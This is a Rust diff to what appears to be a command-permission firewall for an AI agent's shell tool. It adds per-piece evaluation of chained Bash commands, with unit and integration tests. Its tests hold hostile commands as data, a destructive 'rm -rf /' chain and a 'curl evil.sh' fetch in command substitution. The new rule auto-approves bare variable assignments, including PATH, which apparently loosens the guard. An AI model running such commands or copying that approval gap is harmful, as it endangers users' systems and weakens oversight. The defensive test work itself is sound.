@@ -132,12 +132,20 @@ pub fn evaluate_with_elo(
         return decision;
     }
 
-    // 4.5. H1: Shell chain guard — Bash commands containing chain operators (&&, ||, ;, $(...),
-    // backtick) skip trust_circle auto-approve and fall through to defaults (ask).
-    // This prevents the "safe prefix + chained payload" bypass:
-    //   e.g. `echo foo && rm -rf /` would otherwise match trust_circle's echo rule.
-    // Blocked/restricted rules still fire first (steps 1-4), delegations fire at step 2.
-    // Plain pipes (|) are intentionally excluded — safe piped-command rules still apply.
+    // 4.5. M7.10: Chain-aware Bash evaluator. Splits top-level chains (&&/||/;/|)
+    // and re-evaluates each piece against blocked/restricted/trust_circle.
+    // Returns Some(decision) when the chain decision is final; returns None
+    // when the caller should fall through to the legacy chain_guard
+    // (subshell/backtick rejection, single-piece input, flag off, non-Bash).
+    if let Some(decision) = evaluate_chain_aware(config, &all_patterns, payload) {
+        return decision;
+    }
+
+    // 4.6. H1: Shell chain guard — fallback for everything chain_aware refused
+    // to decide (subshells, backticks, unmatched quotes). Preserves the
+    // safe-prefix-plus-payload protection: e.g. `echo foo && rm -rf /` would
+    // still ask here if chain_aware is disabled. With chain_aware enabled,
+    // step 4.5 already handled it.
     if payload.tool_name == "Bash" {
         if let Some(cmd) = payload.tool_input.get("command").and_then(|v| v.as_str()) {
             if contains_shell_chain(cmd) {
@@ -488,6 +496,268 @@ fn normalize_unicode_operators(cmd: &str) -> String {
             _ => c,
         })
         .collect()
+}
+
+/// Recognize a bare shell variable assignment piece: `KEY=value` or `KEY="..."`
+/// or `KEY='...'`, with no following command.
+///
+/// Used by the chain-aware evaluator (M7.10) to auto-approve assignment-only
+/// pieces produced by splitting `KEY=v; cmd` chains. Safety relies on the
+/// caller already having rejected `$(...)` and backticks at the whole-input
+/// scan, so the assignment value cannot embed command substitution.
+///
+/// Conservative grammar: key is `^[A-Z_][A-Z0-9_]*` (uppercase only). Anything
+/// after the value (a space + extra tokens) disqualifies the piece.
+fn is_bare_assignment(piece: &str) -> bool {
+    let trimmed = piece.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+    // Find '=' and validate the key.
+    let eq_pos = match trimmed.find('=') {
+        Some(p) => p,
+        None => return false,
+    };
+    let key = &trimmed[..eq_pos];
+    if key.is_empty() {
+        return false;
+    }
+    if !key
+        .chars()
+        .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
+    {
+        return false;
+    }
+    if !key
+        .chars()
+        .next()
+        .map(|c| c.is_ascii_uppercase() || c == '_')
+        .unwrap_or(false)
+    {
+        return false;
+    }
+    // Validate the value: must be a single token (no unescaped spaces unless
+    // they sit inside matched quotes).
+    let value = &trimmed[eq_pos + 1..];
+    let stripped_value = strip_quoted_regions(value);
+    // After quote stripping, quoted regions have been replaced with spaces.
+    // Trim surrounding spaces (artifact of quote replacement), then check
+    // that no interior whitespace remains — interior whitespace would mean
+    // a follow-up command token outside any quoted region.
+    !stripped_value.trim().contains(char::is_whitespace)
+}
+
+/// Split a Bash command into top-level pieces along `&&`, `||`, `;`, or `|`,
+/// respecting matched single/double quotes. Returns `None` for inputs the
+/// caller must NOT chain-evaluate: presence of `$(`, backticks, or unmatched
+/// quotes — those should fall through to the legacy `chain_guard` ask.
+///
+/// The returned strings are allocated (owned) from the normalized input,
+/// including any surrounding whitespace. Callers should `trim` each piece
+/// before evaluating.
+///
+/// A non-chained input still returns `Some(vec![cmd])` (single element); the
+/// caller decides whether to short-circuit. Unicode homoglyphs are normalized
+/// before scanning so fullwidth `&&` etc. are caught.
+fn split_top_level_chain(cmd: &str) -> Option<Vec<String>> {
+    let normalized = normalize_unicode_operators(cmd);
+    // Reject inputs containing command substitution outside quotes.
+    let stripped = strip_quoted_regions(&normalized);
+    if stripped.contains("$(") || stripped.contains('`') {
+        return None;
+    }
+    // Detect unmatched quote.
+    let mut quote_state: Option<char> = None;
+    for c in normalized.chars() {
+        match (quote_state, c) {
+            (None, '\'') | (None, '"') => quote_state = Some(c),
+            (Some(q), c) if c == q => quote_state = None,
+            _ => {}
+        }
+    }
+    if quote_state.is_some() {
+        return None;
+    }
+
+    // Byte-level scan with quote tracking + top-level operator splitting.
+    let bytes = normalized.as_bytes();
+    let mut pieces: Vec<String> = Vec::new();
+    let mut current_start = 0usize;
+    let mut i = 0usize;
+    let mut in_quote: Option<u8> = None;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = in_quote {
+            if b == q {
+                in_quote = None;
+            }
+            i += 1;
+            continue;
+        }
+        if b == b'\'' || b == b'"' {
+            in_quote = Some(b);
+            i += 1;
+            continue;
+        }
+        // Two-char operators first.
+        if i + 1 < bytes.len() {
+            let pair = &bytes[i..i + 2];
+            if pair == b"&&" || pair == b"||" {
+                pieces.push(normalized[current_start..i].to_string());
+                i += 2;
+                current_start = i;
+                continue;
+            }
+        }
+        if b == b';' || b == b'|' {
+            pieces.push(normalized[current_start..i].to_string());
+            i += 1;
+            current_start = i;
+            continue;
+        }
+        i += 1;
+    }
+    pieces.push(normalized[current_start..].to_string());
+    Some(pieces)
+}
+
+/// Compositional Bash chain evaluator (M7.10).
+///
+/// Returns:
+/// - `None` when the caller should fall through (non-Bash, single-piece input,
+///   `chain_aware` flag off, subshell/backtick rejection, unmatched quotes).
+/// - `Some(decision)` when the chain has been evaluated end-to-end. Fold rule:
+///   any piece blocks → block, any piece asks → ask, all auto-approve →
+///   auto-approve.
+///
+/// Per-piece evaluation reuses `check_rules` against `blocked`, `restricted`,
+/// and `trust_circle`. Bare shell assignments (`KEY=value`) are short-circuited
+/// to auto-approve since the whole-input scan has already excluded command
+/// substitution.
+///
+/// Agent overrides and ELO overrides are NOT re-applied here — the caller's
+/// step 3 already exercised them against the parent payload, and re-applying
+/// would risk a per-piece ELO ask blocking a chain that the global trust
+/// circle approves.
+fn evaluate_chain_aware(
+    config: &FirewallConfig,
+    patterns: &crate::config::CompiledPatterns,
+    payload: &EvaluationInput,
+) -> Option<Decision> {
+    if !config.chain_aware {
+        return None;
+    }
+    if payload.tool_name != "Bash" {
+        return None;
+    }
+    let cmd = payload.tool_input.get("command").and_then(|v| v.as_str())?;
+    let pieces = split_top_level_chain(cmd)?;
+    if pieces.len() < 2 {
+        return None;
+    }
+
+    let mut any_block = false;
+    let mut any_ask = false;
+    let mut matched_rules: Vec<String> = Vec::with_capacity(pieces.len());
+
+    for piece in pieces {
+        let trimmed = piece.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        if is_bare_assignment(trimmed) {
+            matched_rules.push("assignment".to_string());
+            continue;
+        }
+        // Build a synthetic payload for this piece.
+        let mut sub_input = payload.tool_input.clone();
+        if let Some(obj) = sub_input.as_object_mut() {
+            obj.insert(
+                "command".to_string(),
+                serde_json::Value::String(trimmed.to_string()),
+            );
+        }
+        let sub_payload = EvaluationInput {
+            session_id: payload.session_id.clone(),
+            tool_name: payload.tool_name.clone(),
+            tool_input: sub_input,
+            tool_use_id: payload.tool_use_id.clone(),
+            agent_id: payload.agent_id.clone(),
+            agent_type: payload.agent_type.clone(),
+            cwd: payload.cwd.clone(),
+        };
+        // 1. Blocked
+        if let Some(d) = check_rules(&config.blocked, &sub_payload, "blocked", patterns) {
+            any_block = true;
+            matched_rules.push(d.matched_rule.unwrap_or_else(|| "blocked".to_string()));
+            continue;
+        }
+        // 2. Restricted
+        if let Some(d) = check_rules(&config.restricted, &sub_payload, "restricted", patterns) {
+            match d.action {
+                Action::Block => {
+                    any_block = true;
+                }
+                Action::Ask => {
+                    any_ask = true;
+                }
+                Action::AutoApprove => {}
+            }
+            matched_rules.push(d.matched_rule.unwrap_or_else(|| "restricted".to_string()));
+            continue;
+        }
+        // 3. Trust circle
+        if let Some(d) = check_rules(&config.trust_circle, &sub_payload, "trust_circle", patterns) {
+            match d.action {
+                Action::AutoApprove => {
+                    matched_rules
+                        .push(d.matched_rule.unwrap_or_else(|| "trust_circle".to_string()));
+                }
+                Action::Ask => {
+                    any_ask = true;
+                    matched_rules
+                        .push(d.matched_rule.unwrap_or_else(|| "trust_circle".to_string()));
+                }
+                Action::Block => {
+                    any_block = true;
+                    matched_rules
+                        .push(d.matched_rule.unwrap_or_else(|| "trust_circle".to_string()));
+                }
+            }
+            continue;
+        }
+        // 4. No match → defaults (ask). One ask poisons the chain.
+        any_ask = true;
+        matched_rules.push("defaults".to_string());
+    }
+
+    let summary = format!("chain_aware:[{}]", matched_rules.join(","));
+    let action = if any_block {
+        Action::Block
+    } else if any_ask {
+        Action::Ask
+    } else {
+        Action::AutoApprove
+    };
+    let priority = match action {
+        Action::Block => Priority::High,
+        Action::Ask => Priority::Medium,
+        Action::AutoApprove => Priority::Low,
+    };
+    let reason = match action {
+        Action::AutoApprove => format!(
+            "Chain-aware: {} pieces all auto-approved",
+            matched_rules.len()
+        ),
+        Action::Ask => "Chain-aware: at least one piece needs human review".to_string(),
+        Action::Block => "Chain-aware: at least one piece is blocked".to_string(),
+    };
+    Some(Decision {
+        action,
+        reason,
+        matched_rule: Some(summary),
+        priority,
+    })
 }
 
 /// Detect shell chain operators in a Bash command.
@@ -1041,14 +1311,23 @@ mod tests {
     #[test]
     fn test_chain_guard_blocks_and_chain() {
         // H1: "echo foo && rm -rf /" starts with safe "echo" prefix but contains &&
-        // Previously this would match trust_circle's echo rule. Now it must ask.
+        // With chain_aware enabled (M7.10): piece "echo foo" → trust_circle auto-approve,
+        // piece "rm -rf /" → blocked → whole chain is BLOCK.
+        // The original invariant still holds: safe echo prefix does NOT auto-approve the chain.
+        // To test the legacy chain_guard path, use config.chain_aware = false (see disabled test).
         let (config, patterns) = load_test_config_and_patterns();
         let payload = make_payload("Bash", json!({"command": "echo foo && rm -rf /"}));
         let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_ne!(
+            decision.action,
+            Action::AutoApprove,
+            "chained command with && must not be auto-approved"
+        );
+        // chain_aware: rm -rf / is blocked → Block (stronger than old Ask via chain_guard)
         assert_eq!(
             decision.action,
-            Action::Ask,
-            "chained command with && must not be auto-approved"
+            Action::Block,
+            "chain_aware promotes to Block when a piece matches blocked rules"
         );
     }
 
@@ -1446,6 +1725,357 @@ mod tests {
         assert_eq!(
             normalize_unicode_operators("foo\u{FF06}\u{FF06}bar"),
             "foo&&bar"
+        );
+    }
+
+    // ── is_bare_assignment tests (M7.10) ────────────────────────────────────
+
+    #[test]
+    fn test_bare_assignment_simple() {
+        assert!(is_bare_assignment("TOKEN=abc"));
+        assert!(is_bare_assignment("SDK=/path/to/sdk"));
+        assert!(is_bare_assignment("FOO_BAR=value123"));
+    }
+
+    #[test]
+    fn test_bare_assignment_quoted() {
+        assert!(is_bare_assignment("TOKEN=\"some value\""));
+        assert!(is_bare_assignment("PATH='abc:def'"));
+    }
+
+    #[test]
+    fn test_bare_assignment_rejects_command() {
+        assert!(!is_bare_assignment("TOKEN=abc echo hi"));
+        assert!(!is_bare_assignment("FOO=bar; rm -rf /"));
+        assert!(!is_bare_assignment("echo hello"));
+        assert!(!is_bare_assignment("git status"));
+    }
+
+    #[test]
+    fn test_bare_assignment_rejects_lowercase_key() {
+        // Conservative: uppercase + underscore + digits only.
+        assert!(!is_bare_assignment("token=abc"));
+        assert!(!is_bare_assignment("MyVar=foo"));
+    }
+
+    #[test]
+    fn test_bare_assignment_rejects_empty() {
+        assert!(!is_bare_assignment(""));
+        assert!(!is_bare_assignment("   "));
+    }
+
+    // ── split_top_level_chain tests (M7.10) ─────────────────────────────────
+
+    #[test]
+    fn test_split_chain_and_or() {
+        let parts = split_top_level_chain("git status && git log").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "git status ");
+        assert_eq!(parts[1], " git log");
+    }
+
+    #[test]
+    fn test_split_chain_semicolon() {
+        let parts = split_top_level_chain("ls; cat foo; head -5 bar").unwrap();
+        assert_eq!(parts.len(), 3);
+        assert_eq!(parts[0], "ls");
+        assert_eq!(parts[1], " cat foo");
+        assert_eq!(parts[2], " head -5 bar");
+    }
+
+    #[test]
+    fn test_split_chain_pipe() {
+        let parts = split_top_level_chain("git fetch origin main 2>&1 | tail -20").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "git fetch origin main 2>&1 ");
+        assert_eq!(parts[1], " tail -20");
+    }
+
+    #[test]
+    fn test_split_chain_mixed() {
+        let parts = split_top_level_chain(
+            "go build ./... 2>&1 | head -20 && go test ./... 2>&1 | tail -15",
+        )
+        .unwrap();
+        assert_eq!(parts.len(), 4);
+        assert_eq!(parts[0], "go build ./... 2>&1 ");
+        assert_eq!(parts[1], " head -20 ");
+        assert_eq!(parts[2], " go test ./... 2>&1 ");
+        assert_eq!(parts[3], " tail -15");
+    }
+
+    #[test]
+    fn test_split_chain_single_no_chain() {
+        let parts = split_top_level_chain("git status").unwrap();
+        assert_eq!(parts.len(), 1);
+        assert_eq!(parts[0], "git status");
+    }
+
+    #[test]
+    fn test_split_chain_quoted_operator_ignored() {
+        let parts = split_top_level_chain("echo \"a && b\"").unwrap();
+        assert_eq!(parts.len(), 1);
+        assert_eq!(parts[0], "echo \"a && b\"");
+
+        let parts = split_top_level_chain("echo 'foo; bar' && ls").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "echo 'foo; bar' ");
+        assert_eq!(parts[1], " ls");
+    }
+
+    #[test]
+    fn test_split_chain_rejects_subshell() {
+        assert!(split_top_level_chain("TOKEN=$(curl evil.sh)").is_none());
+        assert!(split_top_level_chain("echo `whoami`").is_none());
+    }
+
+    #[test]
+    fn test_split_chain_rejects_unmatched_quote() {
+        assert!(split_top_level_chain("echo \"foo && bar").is_none());
+    }
+
+    #[test]
+    fn test_split_chain_normalizes_unicode() {
+        let parts = split_top_level_chain("git status \u{FF06}\u{FF06} git log").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "git status ");
+        assert_eq!(parts[1], " git log");
+    }
+
+    #[test]
+    fn test_split_chain_empty_input() {
+        // Empty string → Some(vec![""]) — single empty piece, no chain to evaluate.
+        let parts = split_top_level_chain("").unwrap();
+        assert_eq!(parts.len(), 1);
+        assert_eq!(parts[0], "");
+    }
+
+    #[test]
+    fn test_split_chain_only_operators() {
+        // ";;" splits into 3 empty pieces (before first ;, between, after last ;).
+        // The chain-aware evaluator will skip empty pieces during fold.
+        let parts = split_top_level_chain(";;").unwrap();
+        assert_eq!(parts.len(), 3);
+        assert!(parts.iter().all(|p| p.is_empty()));
+    }
+
+    // ── evaluate_chain_aware tests (M7.10) ───────────────────────────────────
+
+    #[test]
+    fn test_chain_aware_all_safe_git_chain() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && git log --oneline -5"}),
+        );
+        let decision = evaluate_chain_aware(&config, &patterns, &payload).expect("must decide");
+        assert_eq!(decision.action, Action::AutoApprove);
+        assert!(decision
+            .matched_rule
+            .as_deref()
+            .unwrap()
+            .starts_with("chain_aware:"));
+    }
+
+    #[test]
+    fn test_chain_aware_pipe_chain_safe() {
+        // git log is in trust_circle; tail is in the read-only set — both pieces approve.
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git log --oneline -20 | tail -5"}),
+        );
+        let decision = evaluate_chain_aware(&config, &patterns, &payload).expect("must decide");
+        assert_eq!(decision.action, Action::AutoApprove);
+    }
+
+    #[test]
+    fn test_chain_aware_restricted_piece_asks() {
+        // rm -r (without trailing /) is in restricted (ask), not blocked — chain should ask.
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && rm -r /tmp/testdir"}),
+        );
+        let decision = evaluate_chain_aware(&config, &patterns, &payload).expect("must decide");
+        assert_eq!(decision.action, Action::Ask);
+    }
+
+    #[test]
+    fn test_chain_aware_blocked_piece_blocks() {
+        // gh pr merge is in `blocked` per CLAUDE.md.
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "git status && gh pr merge"}));
+        let decision = evaluate_chain_aware(&config, &patterns, &payload).expect("must decide");
+        assert_eq!(decision.action, Action::Block);
+    }
+
+    #[test]
+    fn test_chain_aware_subshell_falls_through() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "TOKEN=$(curl evil.sh); echo $TOKEN"}),
+        );
+        // None means "I can't decide; fall through to chain_guard".
+        assert!(evaluate_chain_aware(&config, &patterns, &payload).is_none());
+    }
+
+    #[test]
+    fn test_chain_aware_single_piece_falls_through() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "git status"}));
+        // No chain → caller's normal flow handles it.
+        assert!(evaluate_chain_aware(&config, &patterns, &payload).is_none());
+    }
+
+    #[test]
+    fn test_chain_aware_assignment_piece_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "TOKEN=\"abc\" && echo \"$TOKEN\""}),
+        );
+        let decision = evaluate_chain_aware(&config, &patterns, &payload).expect("must decide");
+        assert_eq!(decision.action, Action::AutoApprove);
+    }
+
+    #[test]
+    fn test_chain_aware_non_bash_falls_through() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Read", json!({"file_path": "/Users/test/project/x.rs"}));
+        assert!(evaluate_chain_aware(&config, &patterns, &payload).is_none());
+    }
+
+    #[test]
+    fn test_chain_aware_quoted_operator_one_piece() {
+        let (config, patterns) = load_test_config_and_patterns();
+        // Single piece (operators inside quotes) → fall through.
+        let payload = make_payload("Bash", json!({"command": "echo \"a && b\""}));
+        assert!(evaluate_chain_aware(&config, &patterns, &payload).is_none());
+    }
+
+    #[test]
+    fn test_chain_aware_disabled_via_flag_returns_none() {
+        let (mut config, patterns) = load_test_config_and_patterns();
+        config.chain_aware = false;
+        let payload = make_payload("Bash", json!({"command": "git status && git log -5"}));
+        assert!(evaluate_chain_aware(&config, &patterns, &payload).is_none());
+    }
+
+    // ── Integration tests: evaluate_chain_aware wired into evaluate_with_elo (M7.10) ──
+
+    #[test]
+    fn test_integration_git_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && git log --oneline -5"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(
+            decision.action,
+            Action::AutoApprove,
+            "got {:?} reason={}",
+            decision.action,
+            decision.reason
+        );
+        assert!(decision
+            .matched_rule
+            .as_deref()
+            .unwrap_or("")
+            .starts_with("chain_aware:"));
+    }
+
+    #[test]
+    fn test_integration_dangerous_chain_falls_to_ask() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && rm -r /tmp/testdir"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::Ask);
+    }
+
+    #[test]
+    fn test_integration_subshell_still_asks_via_chain_guard() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "TOKEN=$(curl evil.sh); echo $TOKEN"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::Ask);
+        assert_eq!(decision.matched_rule.as_deref(), Some("chain_guard"));
+    }
+
+    #[test]
+    fn test_integration_chain_aware_disabled_falls_back_to_chain_guard() {
+        let (mut config, patterns) = load_test_config_and_patterns();
+        config.chain_aware = false;
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && git log --oneline -5"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        // Pre-M7.10 behaviour: chain_guard catches the && and asks.
+        assert_eq!(decision.action, Action::Ask);
+        assert_eq!(decision.matched_rule.as_deref(), Some("chain_guard"));
+    }
+
+    #[test]
+    fn test_integration_pipe_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "find . -name \"*.rs\" | xargs grep -l fn"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::AutoApprove, "got {:?}", decision);
+    }
+
+    #[test]
+    fn test_integration_blocked_piece_blocks_chain() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload("Bash", json!({"command": "git status && gh pr merge"}));
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::Block);
+    }
+
+    #[test]
+    fn test_integration_cd_in_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "cd /Users/test/project && ls -la"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::AutoApprove);
+    }
+
+    #[test]
+    fn test_integration_go_build_test_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "go build ./... 2>&1 | head -20 && go test ./... 2>&1 | tail -15"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(
+            decision.action,
+            Action::AutoApprove,
+            "got {:?} reason={}",
+            decision.action,
+            decision.reason
         );
     }
 }
